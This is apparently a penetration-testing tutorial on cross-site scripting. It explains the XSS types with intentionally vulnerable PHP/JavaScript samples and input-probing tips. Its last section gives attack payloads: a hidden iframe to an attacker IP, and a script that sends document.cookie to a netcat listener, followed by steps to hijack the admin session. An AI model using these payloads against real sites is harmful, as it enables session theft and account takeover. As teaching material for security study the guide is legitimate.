# Cross Site Scripting (XSS)

## XSS Information

Cross-site scripting is one of the oldest web application exploits known, dating back to 1996-1998 when inserted code could manipulate frames within a web page, thereby “crossing” the website bounds. The ultimate goal of cross-site scripting is to inject HTML (also known as HTML injection) or run code (JavaScript) in a user's Web browser.&#x20;

### XSS Vulnerable Code

As always the best way to learn a vulnerability is by understanding **WHY** it's vulnerable.

Let's inspect the following PHP code:

```php
<?php 
    echo '<h4>Hola ' . $_GET['name'] . '</h4>'; 
?>
```

The code above displays a greeting to the user whose name is taken from the `$_GET` variable. The `<parameter,value>` pairs are sent using the HTTP GET method and are stored in the `$_GET` variable. When you click links or type the website URL you want to visit into your browser's address bar, you're using the GET method. The query string of the URL accessed will be used to extract the user input (directly or by clicking on a link).

```http
http://target/hello.php?name=wixnic
```

When the above is sent to the server, a **name** argument with the value **wixnic** will be added to the `$_GET` variable. `?name=wixnic` is referred to as **querystring**.

The web browser will receive the following HTML code from the server:

```markup
<h4>Hola wixnic</h4>
```

Our input is part of the output web page source code.

Let's check what happens if we submit this payload with the same parameter name to the same page:

```markup
http://target/hello.php?name=</h4><script>alert('XSS');</script>
```

In order for the server to process this, it needs to be URL encoded.

After sending the payload. The server returns to us the following code:

```
<h4>Hola </h4> <script>alert('XSS');</script>
```

The above is a working XSS attack. It injects some JavaScript code into the web page source code. The JavaScript code is executed in the browser within the website context.

_**Why does this happen?**_&#x20;

Because the user input is given on output without any kind of **sanitization** (either on input or output).

The PHP developer forgot to validate the **user input** for malicious patterns.

### Types of XSS

**Reflected XSS** is the most common and well-understood form of XSS vulnerabilities. When untrusted user data is submitted to a web application and instantly echoed back as untrusted content, this is what happens.

Then the browser receives the code from the web server response and renders it.

Reflected XSS Vulnerable PHP Code Example:

```php
<?php $nombre = @$_GET['nombre']; ?>
Saludos <?=$nombre?>
```

**Stored XSS** rather than the malicious input being directly reflected into the response, it is saved within the web application. Once this happens, it is then echoed somewhere else within the web application and it might be available to all visitors.

**DOM XSS** is a form of cross-site scripting that exists only within client-side code.

DOM XSS Vulnerable HTML/JavaScript Code:

```markup
<h1 id='saludos'></h1>
<script>
  var w = "Saludos ";
  var nombre =  document.location.hash.substr( 
                document.location.hash.search(/#w!/i)+3,
                document.location.hash.length 
   );                  
document.getElementById('saludos').innerHTML = w + nombre; 
</script>
```

The client-side script code has access to the browser's DOM, and hence all of the data contained therein. The URL, history, cookies, local storage, and a variety of other items are examples of this information.

### Summary

When user input is used somewhere on the web application output, cross-site scripting attacks are feasible; this allows an attacker to take control of the material shown to application users, thereby assaulting the users.

## More Vulnerable Codes

Another vulnerable code in HTML/PHP can be the following:

```php
<html> 
<head><title>Vulnerable to XSS</title></head> 
	<body> 
	<img src="filename.png" alt="<?= $_GET['name'] ?>"> 
	</body> 
</html>
```

The name parameter passed to the application in the URL is printed on output without being sanitized.

This can be exploited like the following example:

```javascript
http://target/index.php?name=<script>alert('XSS')</script>
```

After sending that payload, the website will render this:

```javascript
<html> 
<head><title>Vulnerable to XSS</title></head> 
	<body> 
	<img src="filename.png" alt="<script>alert('XSS')</script>"> 
	</body> 
</html>
```

The problem with this payload is that it will not be executed due to the fact that it is being inserted in the **alt** parameter of the IMG tag.

We have to escape out of the alt tag by using something like the following:

```javascript
http://target/index.php?name=" onload="javascript:alert('XSS Example')
```

The DOM events are often used in XSS exploitation because they allow us to avoid using suspicious characters like “<”, “>”. We don't even need to employ HTML tags in this case; as a result, we may avoid basic input validation algorithms that rely on this type of easy check.

## Enumerating XSS

### **Find Inputs**

Input fields may be found in the following examples:

* Search boxes
* Comments
* Post
* Forms
* Parameters (Including URL)

Input can be one of the following:&#x20;

* GET/POST variables
  * GET = Links (Input Parameter in URL)
  * POST = Forms Submissions
* COOKIE variables
* HTTP headers
  * User-Agent:
  * Others

**Try inserting special characters to see if they are not filtered:**

```markup
< >; ' " { } ;
```

* < >; = denote elements in HTML
* ' " = denote strings on JavaScript
* {} = function declarations of JavaScript
* ; = end of a statement on JavaScript

Try inserting this in URL parameters:

```markup
http://target/file.php?name=<plaintext>
```

**If these characters are NOT removed or encoded then the web app might be vulnerable to XSS:**

* URL Encoding
* HTML Encoding

Also keep in mind that while input validation techniques may allow the harmless plaintext tag, they may not allow tags like IFRAME or IMG.

**Then we might be able to code since we can use this special characters!**

## **XSS Attacks**

### Content Injection 

If we want to place content in the website and the site is vulnerable to XSS then we may be able to use some techniques to "inject" malicious content to the website.

#### iframe Method

The HTML \<iframe> embeds another file within the current HTML document

```
<iframe src=http://192.168.10.10/evil height="0" width="0"></iframe>
```

**The quotes ' " can affect this.**

Visit/Refresh the webpage that has the code and click on the iframe to receive connection back with:

```
sudo nc -lvnp 80 
```

### Stealing Cookies

**Cookies can be set with several option flags:**

* Secure = Instructs the browser to only send the cookie over encrypted connections, such as HTTPS.&#x20;
* HttpOnly = Instructs the browser to deny JavaScript access to the cookie. If it set to **FALSE** we can use an XSS payload to steal the cookie.

#### Stealing Cookies Methodology

Setup a nc listener with the following command:

```
nc -lvnp 80
```

Create the payload to capture the victim's cookie**:**

```
<script>new Image().src="http://192.168.10.10/filename.jpg?output="+document.cookie;</script>
```

Add the cookie from the netcat into the Cooke-Editor Plugin:

{% embed url="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?src=search" %}

`Cookie Editor Plugin > Add > Name: PHPSESSID Value: <cookie_value> -> Save`

After saving the cookie visit the administrator or the unauthorized page:

```
/admin-page.php
```

 
